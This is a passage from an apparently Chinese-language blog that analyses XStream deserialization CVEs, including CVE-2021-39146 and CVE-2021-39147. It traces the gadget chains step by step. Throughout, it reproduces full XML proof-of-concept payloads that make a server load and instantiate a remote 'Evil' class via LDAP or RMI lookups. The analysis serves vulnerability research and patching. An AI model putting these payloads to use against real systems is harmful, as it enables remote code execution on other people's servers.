class="line">          &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">            &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">              &lt;soapPart/&gt;</span><br><span class="line">              &lt;mm&gt;</span><br><span class="line">                &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                  &lt;aliases class=&#x27;com.sun.jndi.ldap.LdapBindingEnumeration&#x27;&gt;</span><br><span class="line">                    &lt;homeCtx&gt;</span><br><span class="line">                      &lt;hostname&gt;127.0.0.1&lt;/hostname&gt;</span><br><span class="line">                      &lt;port__number&gt;2333&lt;/port__number&gt;</span><br><span class="line">                      &lt;clnt class=&#x27;com.sun.jndi.ldap.LdapClient&#x27;/&gt;</span><br><span class="line">                    &lt;/homeCtx&gt;</span><br><span class="line">                    &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;</span><br><span class="line">                    &lt;more&gt;true&lt;/more&gt;</span><br><span class="line">                    &lt;posn&gt;0&lt;/posn&gt;</span><br><span class="line">                    &lt;limit&gt;1&lt;/limit&gt;</span><br><span class="line">                    &lt;entries&gt;</span><br><span class="line">                      &lt;com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                        &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;</span><br><span class="line">                        &lt;attributes class=&#x27;javax.naming.directory.BasicAttributes&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ignoreCase&gt;false&lt;/ignoreCase&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;4&lt;/int&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;objectClass&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;javanamingreference&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;http://127.0.0.1:2333/&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaClassName&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;refClassName&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaFactory&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                        &lt;/attributes&gt;</span><br><span class="line">                      &lt;/com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                    &lt;/entries&gt;</span><br><span class="line">                  &lt;/aliases&gt;</span><br><span class="line">                &lt;/it&gt;</span><br><span class="line">              &lt;/mm&gt;</span><br><span class="line">            &lt;/multiPart&gt;</span><br><span class="line">          &lt;/sm&gt;</span><br><span class="line">        &lt;/message&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>前半部分和CVE-2021-21346很相似，前半部分的调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">XString.equals</span><br><span class="line">Rdn$RdnEntry.compareTo</span><br><span class="line">Rdn$RdnEntry.compareTo</span><br><span class="line">PriorityQueue.siftDownComparable</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131649884.png" alt="image-20230413164907785"></p>
<p>调用Packet的toString方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131651681.png" alt="image-20230413165127579"></p>
<p>调用copy方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131651949.png" alt="image-20230413165109885"></p>
<p>调用copy方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131654916.png" alt="image-20230413165434824"></p>
<p>调用getAttachments方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131656658.png" alt="image-20230413165617067"></p>
<p>创建SAAJAttachmentSet对象。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131657207.png" alt="image-20230413165705115"></p>
<p>调用sm（Message1_1Impl）的getAttachments方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131657254.png" alt="image-20230413165756181"></p>
<p>调用initializeAllAttachments方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131701357.png" alt="image-20230413170122277"></p>
<p>调用getCount方法。在xml中不赋值，boolean类型默认为false。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131702190.png" alt="image-20230413170248093"></p>
<p>调用parse方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131703750.png" alt="image-20230413170306645"></p>
<p>调用parseAll方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131704836.png" alt="image-20230413170447734"></p>
<p>在readSOAPPart方法中会为mm重新赋值，为防止为mm重新赋值，需要给soapPart赋值以防止他为空进入readSOAPPart方法，然后调用mm的getAttachments方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131706360.png" alt="image-20230413170607290"></p>
<p>接着调用parseAll方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131706487.png" alt="image-20230413170631383"></p>
<p>进入makeProgress方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131706320.png" alt="image-20230413170658249"></p>
<p>这里进入KeyStoreResolver$KeyStoreIterator的hasNext方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131708152.png" alt="image-20230413170804077"></p>
<p>接着调用findNextCert方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131709799.png" alt="image-20230413170854328"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131711161.png" alt="image-20230413171150096"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131712607.png" alt="image-20230413171214527"></p>
<p>判断是否有下一个值，有的话取下一个值，aliases属性为LdapBindingEnumeration。调用nextElement取下一个元素的值。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131712674.png" alt="image-20230413171258587"></p>
<p>nextElement方法中又调用了next方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131713955.png" alt="image-20230413171350885"></p>
<p>调用nextImpl方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131714893.png" alt="image-20230413171416806"></p>
<p>调用nextAux方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131716668.png" alt="image-20230413171621589"></p>
<p>取第一个元素的值然后递增，然后调用createItem方法，第一个元素为如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                        &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;</span><br><span class="line">                        &lt;attributes class=&#x27;javax.naming.directory.BasicAttributes&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ignoreCase&gt;false&lt;/ignoreCase&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;4&lt;/int&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;objectClass&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;javanamingreference&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;http://127.0.0.1:2333/&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaClassName&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;refClassName&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaFactory&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                        &lt;/attributes&gt;</span><br><span class="line">                      &lt;/com.sun.jndi.ldap.LdapEntry&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131718068.png" alt="image-20230413171816902"></p>
<p>分为上下部分，在第一个if语句中，判断BasicAttributes中的所有BasicAttribute是否存在attrID为javaClassName的，若有的话，进入if语句，然后调用decodeObject方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131722526.png" alt="image-20230413172208394"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131723166.png" alt="image-20230413172355089"></p>
<p>然后回到createItem方法中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131718068.png" alt="image-20230413171816902"></p>
<p>然后调用<code>obj = DirectoryManager.getObjectInstance(obj, cn, homeCtx,     homeCtx.envprops, attrs);</code>方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131727319.png" alt="image-20230413172724189"></p>
<p>在该方法中，将refInfo赋值给ref，然后获取工厂类名（Evil），再调用<code>getObjectFactoryFromReference</code>方法将参数传递。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131729062.png" alt="image-20230413172923929"></p>
<p>在getObjectFactoryFromReference方法中，先尝试本地加载，加载不到再获取远程位置，然后从远程位置加载工厂类，然后再实例化工厂类，造成任意代码执行。</p>
<h2 id="CVE-2021-39146"><a href="#CVE-2021-39146" class="headerlink" title="CVE-2021-39146"></a>CVE-2021-39146</h2><h3 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成JNDI注入，官方POC经简化后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;test&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;javax.swing.MultiUIDefaults&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;unserializable-parents/&gt;</span><br><span class="line">      &lt;hashtable&gt;</span><br><span class="line">          &lt;default&gt;</span><br><span class="line">            &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">          &lt;/default&gt;</span><br><span class="line">          &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">          &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">      &lt;/hashtable&gt;</span><br><span class="line">      &lt;javax.swing.MultiUIDefaults&gt;</span><br><span class="line">          &lt;default&gt;</span><br><span class="line">            &lt;tables&gt;</span><br><span class="line">            &lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;unserializable-parents/&gt;</span><br><span class="line">              &lt;hashtable&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">                &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                &lt;string&gt;lazyValue&lt;/string&gt;</span><br><span class="line">                &lt;javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br><span class="line">                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">                  &lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">                  &lt;args&gt;</span><br><span class="line">                    &lt;string&gt;rmi://127.0.0.1:1097/Object&lt;/string&gt;</span><br><span class="line">                  &lt;/args&gt;</span><br><span class="line">                &lt;/javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br><span class="line">              &lt;/hashtable&gt;</span><br><span class="line">            &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">            &lt;/tables&gt;</span><br><span class="line">          &lt;/default&gt;</span><br><span class="line">      &lt;/javax.swing.MultiUIDefaults&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;test&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27; /&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>这个和<a href="#CVE-2021-21346">CVE-2021-21346</a>简直一模一样，可以翻回去看看我之前对21346的分析，不同点在于如下xml：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br><span class="line">	&lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">	&lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">	&lt;args&gt;</span><br><span class="line">		&lt;string&gt;rmi://127.0.0.1:1097/Object&lt;/string&gt;</span><br><span class="line">	&lt;/args&gt;</span><br><span class="line">&lt;/javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br></pre></td></tr></table></figure>

<p>也就是在UIDefaults的getFromHashtable方法中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131808123.png" alt="image-20230413180852010"></p>
<p>由于value对象不同导致调用不同的createValue方法，这里调用的是ProxyLazyValue的createValue方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131812946.png" alt="image-20230413181209819"></p>
<p>在createValue方法中，获取类名InitialContext，注册类，获取参数类型，根据参数类型获取该类的doLookup方法，执行该方法，传递实参。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131814337.png" alt="image-20230413181445238"></p>
<p>在doLookup方法造成JNDI注入。</p>
<h2 id="CVE-2021-39147"><a href="#CVE-2021-39147" class="headerlink" title="CVE-2021-39147"></a>CVE-2021-39147</h2><h3 id="分析-24"><a href="#分析-24" class="headerlink" title="分析"></a>分析</h3><p>同样是远程拉取类并实例化造成RCE的漏洞，官方的POC不能直接运行，修正并简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">        &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">        &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">        &lt;bodyParts/&gt;</span><br><span class="line">        &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">          &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">            &lt;soapPart/&gt;</span><br><span class="line">            &lt;mm&gt;</span><br><span class="line">              &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                &lt;aliases class=&#x27;com.sun.jndi.ldap.LdapSearchEnumeration&#x27;&gt;</span><br><span class="line">                  &lt;listArg class=&#x27;javax.naming.CompoundName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                    &lt;javax.naming.CompoundName&gt;</span><br><span class="line">                      &lt;properties/&gt;</span><br><span class="line">                      &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                      &lt;string&gt;ysomap&lt;/string&gt;</span><br><span class="line">                    &lt;/javax.naming.CompoundName&gt;</span><br><span class="line">                  &lt;/listArg&gt;</span><br><span class="line">                  &lt;enumClnt /&gt;</span><br><span class="line">                  &lt;limit&gt;1&lt;/limit&gt;</span><br><span class="line">                  &lt;posn&gt;0&lt;/posn&gt;</span><br><span class="line">                  &lt;homeCtx /&gt;</span><br><span class="line">                  &lt;more&gt;true&lt;/more&gt;</span><br><span class="line">                  &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;</span><br><span class="line">                  &lt;startName class=&#x27;javax.naming.ldap.LdapName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                    &lt;javax.naming.ldap.LdapName&gt;</span><br><span class="line">                      &lt;default /&gt;</span><br><span class="line">                      &lt;string&gt;uid=ysomap,ou=oa,dc=example,dc=com&lt;/string&gt;</span><br><span class="line">                    &lt;/javax.naming.ldap.LdapName&gt;</span><br><span class="line">                  &lt;/startName&gt;</span><br><span class="line">                  &lt;searchArgs&gt;</span><br><span class="line">                    &lt;cons&gt;</span><br><span class="line">                      &lt;returnObj&gt;true&lt;/returnObj&gt;</span><br><span class="line">                    &lt;/cons&gt;</span><br><span class="line">                  &lt;/searchArgs&gt;</span><br><span class="line">                  &lt;entries&gt;</span><br><span class="line">                    &lt;com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                      &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;</span><br><span class="line">                      &lt;attributes class=&#x27;javax.naming.directory.BasicAttributes&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                      &lt;javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                        &lt;default /&gt;</span><br><span class="line">                        &lt;int&gt;4&lt;/int&gt;</span><br><span class="line">                        &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                              &lt;attrID&gt;objectClass&lt;/attrID&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                            &lt;string&gt;javaNamingReference&lt;/string&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;rdn class=&#x27;javax.naming.CompositeName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                &lt;javax.naming.CompositeName&gt;</span><br><span class="line">                                  &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                &lt;/javax.naming.CompositeName&gt;</span><br><span class="line">                              &lt;/rdn&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          